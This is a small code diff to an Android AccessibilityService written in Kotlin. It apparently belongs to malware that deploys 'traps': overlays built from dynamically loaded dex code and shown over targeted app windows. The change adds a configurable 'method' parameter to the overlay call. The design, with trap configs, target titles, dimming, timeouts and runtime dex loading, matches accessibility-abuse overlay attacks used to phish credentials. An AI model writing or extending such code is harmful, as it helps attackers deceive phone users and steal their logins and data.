@@ -889,6 +889,7 @@ class MyAccessibilityService : AccessibilityService() {
                                 val className = trap.getString("class_name")
                                 val timeout = trap.optLong("timeout", 10L)
                                 val dimLevel = trap.optInt("dim", 20)
+                                val method = trap.optString("method", "ACC")
                                 val trapLabel = trap.optString("label", "DefaultNative")
                                 
                                 DebugLogger.log("NATIVE_TRAP", "Deploying native sequence for target: $titleTarget")
@@ -900,7 +901,7 @@ class MyAccessibilityService : AccessibilityService() {
                                 } catch (e: Exception) {}
 
                                 Handler(Looper.getMainLooper()).post {
-                                    DynamicUIManager.showNativeOverlay(this@MyAccessibilityService, dexPath, className, dimLevel)
+                                    DynamicUIManager.showNativeOverlay(this@MyAccessibilityService, dexPath, className, dimLevel, method)
                                 }
                                 
                                 if (timeout > 0L) {
